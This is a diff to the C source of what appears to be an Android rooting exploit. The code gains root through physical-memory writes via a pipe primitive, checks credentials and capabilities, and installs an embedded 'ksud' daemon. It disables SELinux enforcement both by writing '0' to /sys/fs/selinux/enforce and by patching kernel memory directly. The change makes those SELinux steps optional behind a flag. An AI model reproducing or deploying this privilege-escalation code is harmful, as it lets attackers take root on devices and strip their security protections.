@@ -74,15 +74,17 @@ int spawn_root_child(void) {
     report.gid_after = getgid();
     report.euid_after = geteuid();
     report.egid_after = getegid();
-    int enforce_fd = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
-    if (enforce_fd >= 0) {
-      ssize_t wrote = write(enforce_fd, "0", 1);
-      report.setenforce_ret = wrote == 1 ? 0 : -1;
-      report.setenforce_errno = wrote == 1 ? 0 : errno;
-      close(enforce_fd);
-    } else {
-      report.setenforce_ret = -1;
-      report.setenforce_errno = errno;
+    if (opt_disabled_selinux) {
+      int enforce_fd = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
+      if (enforce_fd >= 0) {
+        ssize_t wrote = write(enforce_fd, "0", 1);
+        report.setenforce_ret = wrote == 1 ? 0 : -1;
+        report.setenforce_errno = wrote == 1 ? 0 : errno;
+        close(enforce_fd);
+      } else {
+        report.setenforce_ret = -1;
+        report.setenforce_errno = errno;
+      }
     }
     if (report.setgid_ret == 0 && report.setuid_ret == 0) {
       install_embedded_ksud();
@@ -404,8 +406,11 @@ int install_android_root(int fd) {
           (unsigned long long)real_caps_after[CRED_CAP_EFFECTIVE]);
 
   uint8_t permissive = 0;
-  int selinux_direct_ok =
-    pipe_phys_write_data(fd, selinux_addr, &permissive, sizeof(permissive));
+  int selinux_direct_ok = 1;
+  if (opt_disabled_selinux) {
+    selinux_direct_ok =
+      pipe_phys_write_data(fd, selinux_addr, &permissive, sizeof(permissive));
+  }
   uint8_t selinux_mid = 0xff;
   pipe_phys_read_data(fd, selinux_addr, &selinux_mid, sizeof(selinux_mid));
   pr_info("root selinux direct write ok=%d %u->%u\n", selinux_direct_ok,
@@ -429,5 +434,5 @@ int install_android_root(int fd) {
           selinux_before, selinux_after,
           (unsigned long long)capable_head_before,
           (unsigned long long)capable_head_after);
-  return root_child_done && selinux_after == 0;
+  return root_child_done && (!opt_disabled_selinux || selinux_after == 0);
 }
